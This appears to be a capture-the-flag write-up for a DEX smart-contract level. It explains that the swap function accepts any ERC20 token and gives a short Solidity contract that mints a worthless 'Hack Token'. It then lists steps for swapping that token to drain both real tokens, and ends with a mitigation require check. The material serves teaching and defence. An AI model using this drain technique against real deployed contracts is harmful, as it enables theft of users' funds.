## Objectives

## Vulnerabilities

### Swap open to any ERC20 tokens

The `swap` function is available to any **ERC20** tokens. It is therefore easy to create yout own **ERC20** and some to your EOA
and some to the DEX2 contract. With this you can swap your worthless tokens for the real ones.

## Exploit

1. Write and deploy a new **ERC20** token. Given mint a small amount to the DEX2 contract and a big amount to yourself.
   You can use this hack contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Hacktoken is ERC20 {
    constructor(address _targetAddress) ERC20("Hack Token", "HT") {
        _mint(msg.sender, 1000);
        _mint(_targetAddress, 1);
    }
}
```

2. `approve` the amount of Hack tokens your need to `transfer` to get 100 tokens 1.

3. `swap` that amount to steal all of token 1.

4. Repeat step 2 and 3 for token 2.

## Suggested mitigation

1. Add back the `require` that was taken out from level 22.

```solidity
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```
